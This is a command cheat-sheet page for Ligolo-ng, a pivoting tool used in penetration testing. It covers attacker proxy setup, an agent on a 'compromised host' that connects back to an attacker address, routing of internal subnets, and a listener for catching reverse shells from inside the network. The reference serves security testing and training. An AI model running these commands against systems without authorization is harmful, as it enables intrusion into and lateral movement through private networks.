# Ligolo-ng

> A modern tunneling tool that exposes internal networks through a lightweight TUN interface — pivot without proxychains, using normal routing.

- Category: Pivoting & Tunneling
- Commands: 9
- Page: https://terminal.rokibulroni.com/tool/pivoting/ligolo-ng
- Homepage: https://github.com/nicocha30/ligolo-ng
- Documentation: https://github.com/nicocha30/ligolo-ng/wiki
- Tags: pivoting, tunneling, VPN, TUN

## Install

- other: `Download proxy and agent binaries from https://github.com/nicocha30/ligolo-ng/releases`

## Proxy (attacker)

### ./proxy -selfcert

```bash
./proxy -selfcert
```

Starts the ligolo-ng proxy with a self-signed certificate and opens its console.

### ifconfig / ip tuntap add user <you> mode tun ligolo

```bash
ifconfig / ip tuntap add user <you> mode tun ligolo
```

Example:

```bash
sudo ip tuntap add user kali mode tun ligolo
```

Creates the ligolo TUN interface the proxy routes through.

### sudo ip link set ligolo up

```bash
sudo ip link set ligolo up
```

Brings the TUN interface up.


## Agent (compromised host)

### ./agent -connect <attacker>:<port>

```bash
./agent -connect <attacker>:<port>
```

Example:

```bash
./agent -connect 10.10.14.5:11601
```

Run on the pivot host; connects back to the proxy and appears as a session.

### ./agent -connect <attacker>:<port> -ignore-cert

```bash
./agent -connect <attacker>:<port> -ignore-cert
```

Example:

```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

Accepts the self-signed certificate.


## Routing (in the proxy console)

### session

```bash
session
```

Lists connected agents; pick one to make it active.

### sudo ip route add <subnet> dev ligolo

```bash
sudo ip route add <subnet> dev ligolo
```

Example:

```bash
sudo ip route add 172.16.0.0/24 dev ligolo
```

Routes an internal subnet through the active session — then use tools normally, no proxychains needed.

### start

```bash
start
```

Starts the tunnel for the selected session.

### listener_add --addr 0.0.0.0:<p> --to 127.0.0.1:<p>

```bash
listener_add --addr 0.0.0.0:<p> --to 127.0.0.1:<p>
```

Example:

```bash
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

Opens a reverse port on the agent that forwards to you — handy for catching shells from the internal network.

## Related tools

- [Chisel](https://terminal.rokibulroni.com/tool/pivoting/chisel)
- [ProxyChains-NG](https://terminal.rokibulroni.com/tool/pivoting/proxychains)
- [SSH](https://terminal.rokibulroni.com/tool/lateral/ssh)
